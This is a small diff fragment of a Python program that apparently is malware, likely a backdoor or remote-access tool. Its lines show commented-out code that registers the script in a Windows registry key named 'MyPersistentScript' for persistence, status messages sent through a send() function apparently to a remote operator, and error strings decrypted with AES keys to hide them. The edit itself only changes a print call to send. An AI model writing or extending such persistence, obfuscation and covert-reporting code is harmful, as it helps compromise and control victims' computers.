@@ -901,7 +901,7 @@ import winreg as reg
 #         open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
 #         reg.SetValueEx(open_key, "MyPersistentScript", 0, reg.REG_SZ, file_path)
 #         reg.CloseKey(open_key)
-#         print("Successfully added to registry")
+#         send("Successfully added to registry")
 #     except Exception as e:
 #         send(f"Error adding to registry: {e}")
 
@@ -928,3 +928,4 @@ if __name__ == '__main__':
             run()
     except Exception as e:
         send(f"{aes_decrypt_string(obf_strings['error'], AES_KEY, AES_IV)}: {e}")
+
